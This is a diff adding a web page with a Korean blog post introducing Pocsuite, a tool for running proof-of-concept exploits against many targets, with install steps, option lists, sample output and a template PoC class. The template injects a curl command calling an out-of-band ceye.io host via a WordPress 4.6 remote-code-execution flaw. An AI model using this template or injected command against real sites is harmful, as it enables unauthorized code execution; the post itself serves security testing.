@@ -1,0 +1,603 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="color-scheme" content="dark">
+    <meta name="theme-color" content="#040405">
+
+    
+    <title>PocSuite - PoC 코드 테스팅을 체계적으로 쉽게 하자! | HAHWUL</title>
+
+    
+    
+        <meta name="description" content="Offensive Security Engineer, Developer and H4cker.">
+    
+
+    
+    <meta property="og:title" content="PocSuite - PoC 코드 테스팅을 체계적으로 쉽게 하자!">
+  <meta property="og:type" content="article">
+  <meta property="og:url" content="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/blog/2019/pocsuite-poc/">
+  <meta property="og:description" content="Offensive Security Engineer, Developer and H4cker.">
+  <meta property="og:image" content="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/og.png">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="PocSuite - PoC 코드 테스팅을 체계적으로 쉽게 하자!">
+  <meta name="twitter:description" content="Offensive Security Engineer, Developer and H4cker.">
+  <meta name="twitter:image" content="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/og.png">
+    <meta property="og:site_name" content="PIXN">
+    <meta property="og:locale" content="en_US">
+
+    
+    <link rel="canonical" href="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/blog/2019/pocsuite-poc/">
+    
+
+    
+    <link rel="alternate" type="application/rss+xml" title="HAHWUL" href="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/rss.xml">
+    
+
+    
+    <link rel="icon" type="image/png" href="/favicon.svg" sizes="96x96" />
+    <link rel="icon" type="image/svg+xml" href="/favicon.svg" />
+    <link rel="shortcut icon" href="/favicon.svg" />
+    <link rel="apple-touch-icon" sizes="180x180" href="/favicon.svg" />
+    <meta name="apple-mobile-web-app-title" content="PIXN" />
+    <link rel="manifest" href="/icons/site.webmanifest" />
+
+    
+    <link rel="preload" as="image" href="/images/pixn-mark.svg">
+
+    
+    <link rel="stylesheet" href="/fonts/pretendard/pretendardvariable-dynamic-subset.css">
+
+    
+    <link rel="stylesheet" href="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/assets/main.8885b746.css">
+
+    
+    <link rel="stylesheet" href="/assets/css/highlight/atom-one-dark.min.css?v=f44d507f">
+
+    
+    <script type="application/ld+json">{"@context":"https://schema.org","@type":"Article","headline":"PocSuite - PoC 코드 테스팅을 체계적으로 쉽게 하자!","url":"https://pixn-analytics-portfolio.forhm0220.chatgpt.site/blog/2019/pocsuite-poc/","datePublished":"2019-01-03T00:00:00+00:00","dateModified":"2021-07-10T00:00:00+00:00","image":"https://pixn-analytics-portfolio.forhm0220.chatgpt.site/og-images/blog-2019-pocsuite-poc.png"}</script>
+<script type="application/ld+json">{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"HAHWUL","item":"https://pixn-analytics-portfolio.forhm0220.chatgpt.site/"},{"@type":"ListItem","position":2,"name":"Archive","item":"https://pixn-analytics-portfolio.forhm0220.chatgpt.site/archive/"},{"@type":"ListItem","position":3,"name":"Blog","item":"https://pixn-analytics-portfolio.forhm0220.chatgpt.site/blog/"},{"@type":"ListItem","position":4,"name":"Untitled","item":"https://pixn-analytics-portfolio.forhm0220.chatgpt.site/blog/2019/"},{"@type":"ListItem","position":5,"name":"PocSuite - PoC 코드 테스팅을 체계적으로 쉽게 하자!"}]}</script>
+    <script type="application/ld+json">{"@context":"https://schema.org","@type":"WebSite","name":"HAHWUL","url":"https://pixn-analytics-portfolio.forhm0220.chatgpt.site/","description":"Offensive Security Engineer, Developer and H4cker.","potentialAction":{"@type":"SearchAction","target":{"@type":"EntryPoint","urlTemplate":"https://pixn-analytics-portfolio.forhm0220.chatgpt.site/?q={search_term_string}"},"query-input":"required name=search_term_string"}}</script>
+</head>
+
+<body>
+    <a class="skip-link sr-only" href="#main-content">Skip to content</a>
+    <div class="site-wrapper">
+        <header class="site-header">
+            <div class="header-content">
+                <nav class="main-nav">
+    <div class="nav-logo">
+        <a href="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/" aria-label="PIXN, home">
+            <span class="hw-mark" aria-hidden="true"></span>
+            <span class="nav-wordmark" aria-hidden="true">PIXN</span>
+        </a>
+    </div>
+
+    <button class="nav-toggle" aria-label="Toggle navigation" aria-expanded="false" aria-controls="nav-menu">
+        <span></span>
+        <span></span>
+        <span></span>
+    </button>
+
+    <div class="nav-overlay"></div>
+
+    <div class="nav-menu" id="nav-menu">
+        <a href="/posts/">Posts</a>
+        <a href="/notes/">Notes</a>
+        <a href="/projects/">Projects</a>
+        <a href="/about/">About</a>
+    </div>
+
+    <button class="nav-search" type="button" data-search-trigger aria-label="Open search">
+        <span class="nav-search-key" data-search-key aria-hidden="true">⌘K</span>
+    </button>
+</nav>
+
+<script>
+(function() {
+    const navToggle = document.querySelector('.nav-toggle');
+    const navMenu = document.querySelector('.nav-menu');
+    const navOverlay = document.querySelector('.nav-overlay');
+    const body = document.body;
+
+    function openMenu() {
+        navToggle.setAttribute('aria-expanded', 'true');
+        navToggle.classList.add('active');
+        navMenu.classList.add('active');
+        navOverlay.classList.add('active');
+        body.classList.add('nav-open');
+    }
+
+    function closeMenu() {
+        navToggle.setAttribute('aria-expanded', 'false');
+        navToggle.classList.remove('active');
+        navMenu.classList.remove('active');
+        navOverlay.classList.remove('active');
+        body.classList.remove('nav-open');
+    }
+
+    if (navToggle && navMenu) {
+        navToggle.addEventListener('click', function() {
+            const isExpanded = navToggle.getAttribute('aria-expanded') === 'true';
+            if (isExpanded) {
+                closeMenu();
+            } else {
+                openMenu();
+            }
+        });
+
+        // Close menu when clicking overlay
+        if (navOverlay) {
+            navOverlay.addEventListener('click', closeMenu);
+        }
+
+        // Close menu when clicking a link
+        navMenu.querySelectorAll('a').forEach(function(link) {
+            link.addEventListener('click', closeMenu);
+        });
+
+        // Close menu on escape key
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'Escape') {
+                closeMenu();
+            }
+        });
+    }
+})();
+</script>
+            </div>
+        </header>
+
+        <main id="main-content">
+            <div class="container">
+                
+
+<div class="post-wrapper">
+    <article class="post-content">
+        <header class="page-header">
+            <h1 class="page-title">PocSuite - PoC 코드 테스팅을 체계적으로 쉽게 하자!</h1>
+            <div class="post-meta-section">
+                <div class="post-meta">
+                    
+                    <time class="meta-item" datetime="2019-01-03">
+                        JANUARY 3, 2019
+                    </time>
+                     
+                </div>
+            </div>
+
+            
+            <p class="page-description">Offensive Security Engineer, Developer and H4cker.</p>
+            
+        </header>
+
+        <div class="post-body"><p>knownsec에서 만든 Pocsuite라는 재미있는 툴(+라이브러리)이 있습니다. 활용하기에 따라 테스팅을 많이 편리하게 해줄 수 있는데요,
+간략하게 소개해드릴까 합니다.</p>
+<h2 id="what-is-pocsuite">What is Pocsuite?</h2>
+<p>Pocsuite는 PoC 코드를 쉽게 테스트하기 위한 툴입니다. 보통 python, ruby 같은 스크립트로 PoC가 공개되곤 하는데, 이를 여러 대상에 대해 체크하고 결과를 확인하기엔 여간 귀찮죠.. 그래서 이 툴은 외부에 공개된 PoC에 코드를 추가하여 한번에 다수의 도메인을 테스트하고 관리할 수 있게 지원해줍니다.  당연히 라이브러리 기반이고 command line 명령을 지원합니다.</p>
+<h2 id="how-to-install-use">How to install &amp; Use?</h2>
+<p>아래 git clone 받아서 직접 코드로 실행해도 되지만.. pip로 이미 올라와 있습니다.
+<a href="https://github.com/knownsec/Pocsuite">https://github.com/knownsec/Pocsuite</a></p>
+<p>pip 통해 설치해줍시다. (requirement.txt엔 정의되진 않았지만 request도 의존합니다. 저건 어지간해선 있으시겠지만 혹시 모르니..)</p>
+<pre><code># pip install pocsuite
+</code></pre>
+<pre><code># pip install requests
+</code></pre>
+<p>우선 PocSuite는 2가지 모드를 지원합니다. 하나는 command line, 하나는 interactive</p>
+<p>[ Command Mode ]</p>
+<pre><code># pocsuite
+
+                              ,--. ,--.
+,---. ,---. ,---.,---.,--.,--`--,-'  '-.,---.  {2.0.8-nongit-20190103}
+| .-. | .-. | .--(  .-'|  ||  ,--'-.  .-| .-. :
+| '-' ' '-' \ `--.-'  `'  ''  |  | |  | \   --.
+|  |-' `---' `---`----' `----'`--' `--'  `----'
+`--'                                            http://pocsuite.org
+
+[!] legal disclaimer: Usage of pocsuite for attacking targets without prior mutual consent is illegal.
+
+[*] starting at 04:36:34
+
+[04:36:34] [-] No &quot;url&quot; or &quot;urlFile&quot; or &quot;dork&quot; assigned.
+</code></pre>
+<p>[ Interactive Mode ]</p>
+<pre><code># pcs-console
+
+                              ,--. ,--.
+,---. ,---. ,---.,---.,--.,--`--,-'  '-.,---.  {2.0.8-nongit-20190103}
+| .-. | .-. | .--(  .-'|  ||  ,--'-.  .-| .-. :
+| '-' ' '-' \ `--.-'  `'  ''  |  | |  | \   --.
+|  |-' `---' `---`----' `----'`--' `--'  `----'
+`--'                                            http://pocsuite.org
+
+Pocsuite&gt;
+Pocsuite&gt;
+Pocsuite&gt;
+</code></pre>
+<h2 id="interactive-mode-options">Interactive Mode Options</h2>
+<pre><code>Core Commands Menu (help &lt;command&gt; for details)
+===============================================
+attack          Attack mode, sends exploit payload
+back            Move back from the current Interpreter
+banner          Display an awesome framework banner
+debug           Enter into python debug mode
+exit            Exit the current interpre
+help            Show help menu
+pocadd          Load available poc(s) from a directory or a file
+pocdel          Unload specific poc file(s)
+poclist         Show all available pocs / task pocs
+seebug          Download pocs from seebug with API Token
+set             Set key equal to value
+show            Show available options / modules
+verify          Verify Mode, checks if a vuln exists or not
+</code></pre>
+<h2 id="command-mode-options">Command Mode Options</h2>
+<pre><code>optional arguments:
+  -h, --help            Show help message and exit
+  --version             Show program's version number and exit
+  --update              Update Pocsuite
+
+target:
+  -u URL, --url URL     Target URL (e.g. &quot;http://www.targetsite.com/&quot;)
+  -f URLFILE, --file URLFILE
+                        Scan multiple targets given in a textual file
+  -r POCFILE            Load POC from a file (e.g. &quot;_0001_cms_sql_inj.py&quot;) or directory (e.g. &quot;modules/&quot;)
+
+mode:
+  --verify              Run poc with verify mode
+  --attack              Run poc with attack mode
+
+request:
+  --cookie COOKIE       HTTP Cookie header value
+  --referer REFERER     HTTP Referer header value
+  --user-agent AGENT    HTTP User-Agent header value
+  --random-agent        Use randomly selected HTTP User-Agent header value
+  --proxy PROXY         Use a proxy to connect to the target URL
+  --proxy-cred PROXYCRED
+                        Proxy authentication credentials (name:password)
+  --timeout TIMEOUT     Seconds to wait before timeout connection (default 30)
+  --retry RETRY         Time out retrials times.
+  --delay DELAY         Delay between two request of one thread
+  --headers HEADERS     Extra headers (e.g. &quot;key1: value1\nkey2: value2&quot;)
+  --host HOST           Host in HTTP headers.
+
+params:
+  --extra-params EXTRA_PARAMS
+                        Extra params (e.g. &quot;{username: '***', password: '***'}&quot;)
+
+optimization:
+  --threads THREADS     Max number of concurrent HTTP(s) requests (default 1)
+  --report REPORT       Save a html report to file (e.g. &quot;./report.html&quot;)
+  --batch BATCH         Automatically choose defaut choice without asking.
+  --requires            Check install_requires
+  --quiet               Activate quiet mode, working without logger.
+  --requires-freeze     Check install_requires after register.
+
+Zoomeye or Seebug:
+  --dork DORK           Zoomeye dork used for search.
+  --max-page MAX_PAGE   Max page used in ZoomEye API(10 targets/Page).
+  --search-type SEARCH_TYPE
+                        search type used in ZoomEye API, web or host
+  --vul-keyword VULKEYWORD
+                        Seebug keyword used for search.
+  --ssv-id SSVID        Seebug SSVID number for target PoC.
+</code></pre>
+<h2 id="how-to-test-with-pocsuite">How to test with Pocsuite</h2>
+<p>위에 옵션 참고하면서 보심 좋습니다. 주요 옵션은 이렇습니다.</p>
+<p>-r : poc file
+-u : url
+-f : url list file
+--verify : 취약 여부만 체크
+--attack : 공격</p>
+<p>우선 테스트를 위한 PoC 하나를 받아봅시다 (wordpress RCE이고 knownsec이 이미 Pocsuite 포맷으로 구성한 코드입니다. )</p>
+<pre><code># wget https://raw.githubusercontent.com/knownsec/Pocsuite/dev/modules/wordpress_core_4_6_rce.py
+</code></pre>
+<pre><code># pocsuite -r 123.py -u http://192.168.0.13:3000 --verify
+
+                              ,--. ,--.
+,---. ,---. ,---.,---.,--.,--`--,-'  '-.,---.  {2.0.8-nongit-20190103}
+| .-. | .-. | .--(  .-'|  ||  ,--'-.  .-| .-. :
+| '-' ' '-' \ `--.-'  `'  ''  |  | |  | \   --.
+|  |-' `---' `---`----' `----'`--' `--'  `----'
+`--'                                            http://pocsuite.org
+
+[!] legal disclaimer: Usage of pocsuite for attacking targets without prior mutual consent is illegal.
+
+[*] starting at 04:49:24
+
+[04:49:24] [*] checking WordPress Core 4.6 - Unauthenticated Remote Code Execution
+[04:49:24] [*] poc:'WordPress Core 4.6 - Unauthenticated Remote Code Execution' target:'http://192.168.0.13:3000'
+
++---------------------------+----------+--------+-----------+---------+--------+
+| target-url                | poc-name | poc-id | component | version | status |
++---------------------------+----------+--------+-----------+---------+--------+
+| http://192.168.0.13:3000 |   123    | 93077  | WordPress |   4.6   | failed |
++---------------------------+----------+--------+-----------+---------+--------+
+success : 0 / 1
+
+[*] shutting down at 04:49:28
+</code></pre>
+<p>이런식으로 정리된 결과를 볼 수 있습니다.</p>
+<p>request 관련 옵션을 따로 줄 수 있는데, 활용하면 Custom한 HTTP Request를 생성할 수 있습니다.</p>
+<pre><code>  --cookie COOKIE       HTTP Cookie header value
+  --referer REFERER     HTTP Referer header value
+  --user-agent AGENT    HTTP User-Agent header value
+  --random-agent        Use randomly selected HTTP User-Agent header value
+  --proxy PROXY         Use a proxy to connect to the target URL
+  --proxy-cred PROXYCRED
+                        Proxy authentication credentials (name:password)
+  --timeout TIMEOUT     Seconds to wait before timeout connection (default 30)
+  --retry RETRY         Time out retrials times.
+  --delay DELAY         Delay between two request of one thread
+  --headers HEADERS     Extra headers (e.g. &quot;key1: value1\nkey2: value2&quot;)
+  --host HOST           Host in HTTP headers.
+</code></pre>
+<p>인터렉티브도 비슷비슷합니다. msf랑 비슷하고 음.. 그냥 한번 해보심 딱 옵니다..</p>
+<h2 id="how-to-make-poc-file-for-pocsuite">How to make PoC file for PocSuite</h2>
+<p>자 그럼 가장 중요한 부분인데요, 일반 PoC 코드를 PocSuite 적용에 대한 부분입니다. pocsuite가 라이브러리 형태로 제공되기 떄문에 python 코드단에서 import하여 사용할 수 있습니다.</p>
+<pre><code>from pocsuite.net import req
+from pocsuite.poc import POCBase, Output
+from pocsuite.utils import register
+</code></pre>
+<p>그다음 가장 중요한 PoC Class를 생성해주고 register() 함수로 PoC를 등록해줍니다.</p>
+<pre><code>class TestPOC(POCBase):
+    name = ‘PoC 이름 '
+    vulID = ’Numbering'
+    author = [‘만든이!']
+    vulType = 'cmd-exec'
+    version = '1.0'    # default version: 1.0
+    references = [‘msf module이랑 비슷.. 참조 링크']
+    desc = 'PoC에 대한 설명입니다.'
+
+    vulDate = '2013-02-14'
+    createDate = '2017-05-03'
+    updateDate = '2017-05-04'
+
+    appName = 'WordPress'
+    appVersion = '4.6'
+    appPowerLink = 'https://wordpress.org'
+    samples = ['']
+
+    # verify 시 결과 데이터를 어떻게 줄것인지 정의
+    def verify_result(self, flag):
+        url = &quot;http://ceye.io/api/record?token=[YOUR CEYE TOKEN]&amp;type=request&amp;filter=wordpress&quot;
+        match_string = &quot;wordpress.YOU-CEYE-ACCOUNT.ceye.io/{0}&quot;.format(flag)
+        try:
+            resp = req.get(url, timeout=30)
+            if resp.content:
+                if match_string in resp.content:
+                    return True
+        except Exception:
+            pass
+        return False
+
+    # 실제로 아래 attack, verify가 로직이 들어가는 부분이고
+    # 보통의 경우 원래 PoC 코드에서 트리거 시키는 부분을 넣어주 면 될 것 같습니다.
+
+    # attack 모드일 때 동작
+    def _attack(self):
+        &quot;&quot;&quot;attack mode&quot;&quot;&quot;
+        return self._verify()
+    # verify 모드일 때 동작
+    def _verify(self):
+        &quot;&quot;&quot;verify mode&quot;&quot;&quot;
+        result = {}
+        self.url = self.url + '/wp-login.php?action=lostpassword'
+        flag = &quot;&quot;.join(random.choice(string.ascii_letters) for _ in xrange(0, 8))
+        flag = flag.lower()
+        cmd = &quot;/usr/bin/curl wordpress.YOU-CEYE-ACCOUNT.ceye.io/{0}&quot;.format(flag)
+        resp = send_command(self.url, cmd)
+        time.sleep(2)
+        if self.verify_result(flag):
+            result['VerifyInfo'] = {}
+            result['VerifyInfo']['URL'] = self.url
+        return self.parse_output(result)
+
+    def parse_output(self, result):
+        output = Output(self)
+        if result:
+            output.success(result)
+        else:
+            output.fail('Internet nothing returned')
+        return output
+
+# 등록!
+register(TestPOC)
+</code></pre>
+<p>길어보일 수 있으나 복잡한건 아닙니다. 기존 PoC 코드에서 실행 부분들(e.g. exploit, run 등등) 등을 뗴어내어서 인자값을 받도록 바꿔주고 class TestPOC(POCBase): 로 class 선언해서 verify. Attack 부분에 해당 부분을 트리거 해주면 됩니다. 위에 description, title등의 부분은 잘 해놓으면 나중에 보기 편리하겠죠.</p>
+<h2 id="reports">Reports</h2>
+<p>output, report 포맷은 3rd party로 툴을 활용할 떄 중요시 보는 부분인데요, 안타깝게도 html 포맷만 지원합니다.. 그래도 결과를 가볍게 주는편이라 파싱하시는데 부담은 없을듯합니다.</p>
+<pre><code>  --report REPORT       Save a html report to file (e.g. &quot;./report.html&quot;)
+</code></pre>
+<pre><code>&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;zh-cn&quot;&gt;
+    &lt;head&gt;
+        &lt;meta charset=&quot;utf-8&quot;&gt;
+        &lt;title&gt;&lt;/title&gt;
+        &lt;style type=&quot;text/css&quot;&gt;
+        caption{padding-top:8px;padding-bottom:8px;color:#777;text-align:left}th{text-align:left}.table{width:100%;max-width:100%;margin-bottom:20px}.table&gt;thead&gt;tr&gt;th,.table&gt;tbody&gt;tr&gt;th,.table&gt;tfoot&gt;tr&gt;th,.table&gt;thead&gt;tr&gt;td,.table&gt;tbody&gt;tr&gt;td,.table&gt;tfoot&gt;tr&gt;td{padding:8px;line-height:1.42857143;vertical-align:top;border-top:1px solid #ddd}.table&gt;thead&gt;tr&gt;th{vertical-align:bottom;border-bottom:2px solid #ddd}.result0{display:none}.result1{}.status{cursor: pointer;}
+        &lt;/style&gt;
+        &lt;script&gt;
+            function showDetail(dom){
+                parent = dom.parentElement;
+                detail = parent.children[1];
+                if (detail == undefined){
+                    return;
+                };
+                if (detail.className == 'result0'){
+                    detail.className = 'result1';
+                }else{
+                    detail.className = 'result0';
+                };
+            }
+        &lt;/script&gt;
+    &lt;/head&gt;
+    &lt;body&gt;
+        &lt;div class=&quot;container&quot;&gt;
+            &lt;table class=&quot;table&quot;&gt;
+                &lt;thead&gt;
+                    &lt;th&gt;target-url&lt;/td&gt;  &lt;th&gt;poc-name&lt;/td&gt;  &lt;th&gt;poc-id&lt;/td&gt;  &lt;th&gt;component&lt;/td&gt;  &lt;th&gt;version&lt;/td&gt;  &lt;th&gt;status&lt;/td&gt;
+                &lt;/thead&gt;
+                &lt;tbody&gt;
+                    &lt;tr class='status' onclick='showDetail(this)'&gt; &lt;td&gt;http://192.168.0.13:3000&lt;/td&gt;  &lt;td&gt;123&lt;/td&gt;  &lt;td&gt;93077&lt;/td&gt;  &lt;td&gt;WordPress&lt;/td&gt;  &lt;td&gt;4.6&lt;/td&gt;  &lt;td&gt;failed&lt;/td&gt; &lt;/tr&gt;
+                &lt;/tbody&gt;
+            &lt;/table&gt;
+        &lt;/div&gt;
+    &lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<p>이럴만도 한 이유가 결국 python library로 제공된다는점인데요, 베스트는 퓨어코드로 그대로 쓰는게 아닐까 싶습니다 :)</p>
+<p><a href="https://3.bp.blogspot.com/-60snPCGT7cY/XC5EVID-NgI/AAAAAAAADoQ/XZ34-qsppLodPqcueGv1-erkoLQ4TyXgQCLcBGAs/s1600/1413.png"><img loading="lazy" src="https://3.bp.blogspot.com/-60snPCGT7cY/XC5EVID-NgI/AAAAAAAADoQ/XZ34-qsppLodPqcueGv1-erkoLQ4TyXgQCLcBGAs/s640/1413.png" alt="" /></a></p>
+</div>
+
+        <div class="footnotes-area"></div>
+
+        
+            
+            
+                
+                
+                
+                
+                
+                
+                
+                
+            
+        
+    </article>
+
+    
+</div>
+
+            </div>
+        </main>
+
+        <footer class="site-footer">
+    <div class="container">
+        <div class="footer-content">
+            <span class="hw-mark footer-mark" aria-hidden="true"></span>
+            <nav class="footer-menu" aria-label="Footer">
+                <a href="/tags/">TAGS</a>
+                <a href="/about/uses/">USES</a>
+                <a href="/contact/">CONTACT</a>
+                <a href="/feeds/">FEEDS</a>
+                <a href="/privacy/">PRIVACY</a>
+            </nav>
+            <div class="socials">
+                <a
+                    href="https://github.com/hahwul"
+                    target="_blank"
+                    rel="noopener noreferrer"
+                    title="GitHub"
+                    aria-label="GitHub"
+                    ><svg
+                        aria-hidden="true"
+                        fill="currentColor"
+                        xmlns="http://www.w3.org/2000/svg"
+                        viewBox="0 0 24 24"
+                    >
+                        <path
+                            d="M12 0c-6.626 0-12 5.373-12 12 0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23.957-.266 1.983-.399 3.003-.404 1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576 4.765-1.589 8.199-6.086 8.199-11.386 0-6.627-5.373-12-12-12z"
+                        /></svg
+                ></a>
+                <a
+                    href="https://x.com/hahwul"
+                    target="_blank"
+                    rel="noopener noreferrer"
+                    title="X"
+                    aria-label="X (Twitter)"
+                    ><svg
+                        aria-hidden="true"
+                        fill="currentColor"
+                        xmlns="http://www.w3.org/2000/svg"
+                        viewBox="0 0 24 24"
+                    >
+                        <path
+                            d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"
+                        /></svg
+                ></a>
+                <a
+                    href="https://www.instagram.com/hahwul_"
+                    target="_blank"
+                    rel="noopener noreferrer"
+                    title="Instagram"
+                    aria-label="Instagram"
+                    ><svg
+                        aria-hidden="true"
+                        fill="currentColor"
+                        xmlns="http://www.w3.org/2000/svg"
+                        viewBox="0 0 24 24"
+                    >
+                        <path
+                            d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zm0-2.163c-3.259 0-3.667.014-4.947.072-4.358.2-6.78 2.618-6.98 6.98-.059 1.281-.073 1.689-.073 4.948 0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98 1.281.058 1.689.072 4.948.072 3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98-1.281-.059-1.69-.073-4.949-.073zm0 5.838c-3.403 0-6.162 2.759-6.162 6.162s2.759 6.163 6.162 6.163 6.162-2.759 6.162-6.163c0-3.403-2.759-6.162-6.162-6.162zm0 10.162c-2.209 0-4-1.79-4-4 0-2.209 1.791-4 4-4s4 1.791 4 4c0 2.21-1.791 4-4 4zm6.406-11.845c-.796 0-1.441.645-1.441 1.44s.645 1.44 1.441 1.44c.795 0 1.439-.645 1.439-1.44s-.644-1.44-1.439-1.44z"
+                        /></svg
+                ></a>
+            </div>
+            <p>Developed and Designed by Me<br />2026 HAHWUL.</p>
+        </div>
+    </div>
+</footer>
+        <div
+    class="search-overlay"
+    data-search-overlay
+    data-search-index="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/search_index.json"
+    data-search-empty="Type to search posts, notes, projects and the archive."
+    data-search-no-results="No results found."
+    data-search-loading="Loading index"
+    data-search-error="Unable to load search index. Refresh and try again."
+    aria-hidden="true"
+>
+    <div class="search-panel" role="dialog" aria-modal="true" aria-label="Search">
+        <div class="search-header">
+            <div class="search-input-wrapper">
+                <input
+                    type="search"
+                    name="search"
+                    placeholder="Search the site, #tag to filter"
+                    aria-label="Search the site"
+                    autocomplete="off"
+                    spellcheck="false"
+                    data-search-input
+                >
+            </div>
+            <div class="search-meta">
+                <span class="search-shortcut" data-search-key>⌘K</span>
+                <button class="search-close" type="button" data-search-close aria-label="Close search">
+                    Esc
+                </button>
+            </div>
+        </div>
+        <div class="search-filters" data-search-filters>
+            <div class="search-filter-group" role="group" aria-label="Filter by type" data-filter-group="type">
+                <button type="button" class="search-chip is-active" data-filter-type="all" aria-pressed="true">All<span class="search-chip-count" data-chip-count></span></button>
+                <button type="button" class="search-chip" data-filter-type="post" aria-pressed="false">Posts<span class="search-chip-count" data-chip-count></span></button>
+                <button type="button" class="search-chip" data-filter-type="note" aria-pressed="false">Notes<span class="search-chip-count" data-chip-count></span></button>
+                <button type="button" class="search-chip" data-filter-type="project" aria-pressed="false">Projects<span class="search-chip-count" data-chip-count></span></button>
+                <button type="button" class="search-chip" data-filter-type="archive" aria-pressed="false">Archive<span class="search-chip-count" data-chip-count></span></button>
+                <button type="button" class="search-chip" data-filter-type="page" aria-pressed="false">Pages<span class="search-chip-count" data-chip-count></span></button>
+            </div>
+            <div class="search-filter-group search-filter-group--lang" role="group" aria-label="Filter by language" data-filter-group="lang">
+                <button type="button" class="search-chip is-active" data-filter-lang="all" aria-pressed="true">All</button>
+                <button type="button" class="search-chip" data-filter-lang="en" aria-pressed="false">EN</button>
+                <button type="button" class="search-chip" data-filter-lang="ko" aria-pressed="false">KO</button>
+            </div>
+        </div>
+        <div class="search-status" data-search-status></div>
+        <div class="search-results" data-search-results aria-live="polite">
+            <p class="search-empty" data-search-empty>Type to search posts, notes, projects and the archive.</p>
+        </div>
+    </div>
+</div>
+    </div>
+
+    
+    
+
+    
+    <script src="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/assets/app.1881a2e0.js" defer></script>
+</body>
+
+</html>
